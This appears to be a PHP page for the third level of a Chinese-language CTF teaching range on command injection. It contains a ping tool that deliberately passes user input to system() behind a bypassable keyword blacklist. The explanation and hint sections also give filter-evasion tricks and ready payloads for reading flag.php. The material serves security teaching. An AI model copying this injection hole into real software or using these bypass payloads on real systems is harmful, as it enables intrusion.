<?php
// ============================================================
// rce3 · 命令注入之"关键字黑名单"
// 过滤：cat/tac/nl/more/less/head/tail/od/strings/flag 全家
// 绕过：c''at、ca\t、变量拼接 a=c;b=at;$a$b（以及 base64 管道）
// ============================================================
$output = null;
$blocked = false;
$ip_param = isset($_GET['ip']) ? $_GET['ip'] : '';
$blacklist = 'cat|tac|nl|more|less|head|tail|od|strings|flag';
if ($ip_param !== '') {
    if (preg_match('/' . $blacklist . '/i', $ip_param)) {
        $blocked = true;                      // ← v3 修复：关键字黑名单
    } else {
        ob_start();
        system('ping -c 2 ' . $ip_param);
        $output = ob_get_clean();
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>rce3 · 过滤了关键字 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#0ea5e9;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:65%;min-width:220px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
.warnbox{background:#3b1519;border:1px solid #7f1d1d;color:#fca5a5;border-radius:8px;padding:10px 14px;margin-top:12px}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">RCE · 命令注入 · 第 3 关</span>
<h1>Ping 诊断工具 v3 —— 关键字黑名单</h1>
<div class="meta">难度：★★☆☆☆ 进阶 | 关卡 ID：<code>rce3</code> · 运行时：PHP</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>被打了两次之后，运维换上了"WAF 规则"：请求里只要出现 <code>cat</code>、<code>flag</code> 等读文件相关的关键字，直接拦截，命令根本不会执行。</p>
<p>目标：还是把当前目录 <code>flag.php</code> 的内容读出来。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="">
<label>目标 IP：<input type="text" name="ip" placeholder="例如 127.0.0.1" value="<?= htmlspecialchars($ip_param, ENT_QUOTES) ?>"></label>
<button type="submit">开始 Ping</button>
</form>
<?php if ($blocked): ?>
<div class="warnbox">🚫 检测到危险关键字（<?= htmlspecialchars($blacklist, ENT_QUOTES) ?>，不区分大小写），已拦截本次请求。</div>
<?php elseif ($output !== null): ?>
<div class="result"><div class="t">命令输出</div>
<pre><?= htmlspecialchars($output, ENT_QUOTES) ?></pre></div>
<?php endif; ?>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p>本关过滤代码：</p>
<pre>&lt;?php
$blacklist = 'cat|tac|nl|more|less|head|tail|od|strings|flag';
if (preg_match('/' . $blacklist . '/i', $_GET['ip'])) { 拦截; }
system('ping -c 2 ' . $_GET['ip']);
?&gt;</pre>
<p>关键认知：<b>黑名单检查的是"原始字符串"，而 shell 解析发生在其后</b>。对 shell 来说，下面这些写法解析完都是同一个命令 <code>cat flag.php</code>：</p>
<table>
<tr><th>写法</th><th>原理</th></tr>
<tr><td><code>c''at</code> / <code>c"a"t</code></td><td>相邻的引号（含空引号）在 shell 解析时被去掉，字符串照样拼接成 cat</td></tr>
<tr><td><code>ca\t fl\ag.php</code></td><td>反斜杠转义：`\t` 就是字符 t。注意 PHP 里要用 <code>%5C</code> 传反斜杠</td></tr>
<tr><td><code>a=c;b=at;$a$b</code></td><td>变量拼接：先定义再引用，黑名单看到的只是 c 和 at</td></tr>
<tr><td><code>echo xx|base64 -d|sh</code></td><td>把命令 base64 编码后再解码执行，明文关键字完全消失</td></tr>
</table>
<p>通用思路：**让"过滤时看到的字符串"和"shell 解析后的命令"不一致**。空格那一关（rce2）考的也是同一件事。</p>
</section>

<section class="card">
<h2>渐进提示</h2>
<details><summary>提示 1：摸清黑名单范围</summary><p>分别提交 <code>?ip=cat</code>、<code>?ip=flag</code>、<code>?ip=127.0.0.1;id</code> 感受哪些词被拦。<code>id</code> 不在名单里，说明注入本身还在。</p></details>
<details><summary>提示 2：让关键字"变形"</summary><p>shell 解析时会吞掉引号和反斜杠：<code>c''at</code> = <code>ca\t</code> = <code>c"a"t</code> = <code>cat</code>。变量拼接 <code>a=c;b=at;$a$b</code> 也一样。</p></details>
<details><summary>提示 3：别忘了文件名里也有 flag</summary><p>黑名单还挡了 <code>flag</code> 这个词，所以文件名同样要变形。payload：<br><code>?ip=127.0.0.1;c''at fl''ag.php</code><br><code>?ip=127.0.0.1;ca%5Ct fl%5Cag.php</code><br><code>?ip=127.0.0.1;a=c;b=at;$a$b fl''ag.php</code></p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="../rce2">← 上一关：rce2</a><a href="../rce4">下一关：rce4 · 无回显注入 →</a></nav>
<footer>CTF Web 教学式靶场 · B 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=rce3&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
